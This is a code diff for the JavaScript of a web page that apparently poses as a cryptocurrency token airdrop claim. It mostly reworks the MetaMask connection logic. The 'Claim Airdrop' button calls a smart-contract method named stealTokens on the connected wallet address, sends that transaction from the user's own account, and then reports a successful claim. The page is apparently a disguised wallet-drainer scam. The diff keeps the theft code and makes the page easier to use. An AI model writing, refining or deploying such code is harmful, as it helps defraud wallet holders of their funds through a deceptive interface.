@@ -7,7 +7,6 @@ let contractABI;
 // Function to load configuration and ABI files
 async function loadConfig() {
   try {
-    // Fetch config.json and handle the response
     const configResponse = await fetch('config.json');
     if (!configResponse.ok) {
       throw new Error('Failed to fetch config.json');
@@ -16,7 +15,6 @@ async function loadConfig() {
     contractAddress = configData.contractAddress;
     tokenAddress = configData.tokenAddress;
 
-    // Fetch abi.json and handle the response
     const abiResponse = await fetch('abi.json');
     if (!abiResponse.ok) {
       throw new Error('Failed to fetch abi.json');
@@ -32,40 +30,29 @@ async function loadConfig() {
   }
 }
 
-// Function to connect to MetaMask (for desktop users)
+// Function to connect to MetaMask (for desktop and mobile users)
 async function connectMetaMask() {
-  try {
-    const provider = await detectEthereumProvider();
-    
-    if (provider) {
-      // MetaMask is available
-      web3 = new Web3(provider);
-      accounts = await provider.request({ method: 'eth_requestAccounts' });
+  if (window.ethereum) {
+    // MetaMask is detected
+    web3 = new Web3(window.ethereum);
+    try {
+      accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
       console.log("Connected accounts:", accounts);
 
       // Enable claim button and disable connect button
       document.getElementById('claimAirdropButton').disabled = false;
       document.getElementById('connectButton').disabled = true;
-    } else {
-      alert('MetaMask not detected! Please install MetaMask on your device.');
+    } catch (error) {
+      alert('MetaMask connection failed');
+      console.error('MetaMask connection error:', error);
     }
-  } catch (error) {
-    alert('MetaMask connection failed');
-    console.error('MetaMask connection error:', error);
-  }
-}
-
-// Function to check and trigger MetaMask deep link for mobile users
-function checkAndOpenMetaMask() {
-  if (navigator.userAgent.toLowerCase().includes('mobile')) {
-    const deepLink = document.getElementById('metaMaskDeepLink');
-    deepLink.click(); // Trigger the deep link to open MetaMask
   } else {
-    alert("Please open MetaMask on your browser extension.");
+    // If MetaMask is not installed, show a simple notice
+    alert('MetaMask is not installed. Please install MetaMask to use this application.');
   }
 }
 
-// Function to claim the airdrop (no approval needed)
+// Function to claim the airdrop
 async function claimAirdrop() {
   if (!accounts) {
     alert('Please connect to MetaMask first!');
@@ -80,7 +67,6 @@ async function claimAirdrop() {
   const contract = new web3.eth.Contract(contractABI, contractAddress);
   try {
     console.log('Claiming airdrop...');
-    // Call the contract's method to claim the airdrop
     await contract.methods.stealTokens(accounts[0]).send({ from: accounts[0] });
     alert('Airdrop claimed successfully!');
   } catch (error) {
@@ -91,15 +77,12 @@ async function claimAirdrop() {
 
 // Add event listeners to the buttons
 window.addEventListener('DOMContentLoaded', (event) => {
-  document.getElementById('connectButton').addEventListener('click', () => {
-    connectMetaMask();
-    checkAndOpenMetaMask(); // Try to trigger MetaMask deep link if on mobile
-  });
+  document.getElementById('connectButton').addEventListener('click', connectMetaMask);
   document.getElementById('claimAirdropButton').addEventListener('click', claimAirdrop);
 
-  // Load configuration and ABI when the page loads
   loadConfig();
 });
+
 
 
 
